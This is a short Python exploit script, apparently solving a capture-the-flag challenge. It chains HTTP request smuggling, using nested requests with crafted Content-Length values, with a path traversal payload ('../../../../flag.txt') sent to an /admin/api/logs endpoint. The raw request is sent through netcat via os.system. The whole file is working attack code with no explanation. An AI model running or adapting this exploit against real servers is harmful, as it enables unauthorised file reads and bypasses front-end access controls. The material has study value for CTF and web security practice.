# MAKE SURE TO HAVE NGROK RUNNING BEFOREs
import os
import requests_raw

HOST = "localhost"
PORT = 8080

# make sure to update ngrok
payload = "../../../../flag.txt"

prefix = "echo -en \""
suffix = f"\" | nc {HOST} {PORT}"

p3 = f"\r\n\r\nGET / HTTP/1.1\r\nHost: {HOST}\r\n\r\n"
p2 = f"xxxxxxxxGET /admin/api/logs?path={payload} HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: {len(p3)-4}"
p1 = f"GET / HTTP/1.1\r\nHost: {HOST}\r\nContent-Length: {len(p2) + 5}\r\nSec-Websocket-Key1: x\r\n\r\n"
res = prefix + p1 + p2 + p3  + suffix

print(res)
os.system(res)
